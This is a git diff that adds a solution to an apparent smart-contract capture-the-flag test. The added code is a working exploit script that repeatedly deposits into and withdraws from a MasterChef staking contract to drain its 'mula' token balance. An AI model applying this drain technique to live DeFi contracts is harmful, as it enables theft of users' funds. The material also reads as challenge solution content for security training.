@@ -58,6 +58,25 @@ before(async () => {
 it("solves the challenge", async function () {
 
   // implement solution here
+  await mula.connect(attacker).approve(masterChef.address, ethers.constants.MaxUint256)
+  let b = await mula.balanceOf(attacker.getAddress());
+  while(true){
+    console.log(await mula.balanceOf(masterChef.address))
+    await masterChef.connect(attacker).deposit(0,b)
+    console.log(await mula.balanceOf(masterChef.address));
+    let c = (await mula.balanceOf(masterChef.address)).sub(1)
+    if(c.lt(b)){
+      await masterChef.connect(attacker).withdraw(0, c);
+      console.log(await mula.balanceOf(masterChef.address));
+      break
+    }
+    else
+    {await masterChef.connect(attacker).withdraw(0,b);}
+
+    b=b.mul(95).div(100)
+  }
+  await masterChef.connect(attacker).deposit(0, 1);
+  console.log(await mula.balanceOf(masterChef.address));
 
 });
 
